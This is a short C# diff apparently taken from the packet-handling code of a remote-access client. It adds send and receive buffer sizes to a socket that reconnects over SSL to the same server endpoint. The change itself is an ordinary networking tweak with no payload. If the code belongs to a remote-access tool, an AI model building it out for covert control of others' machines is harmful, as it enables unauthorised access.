@@ -22,7 +22,11 @@ namespace Client.Handle_Packet
         {
             try
             {
-                Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                {
+                    SendBufferSize = 50 * 1024,
+                    ReceiveBufferSize = 50 * 1024,
+                };
                 Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
 
                 SslStream SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
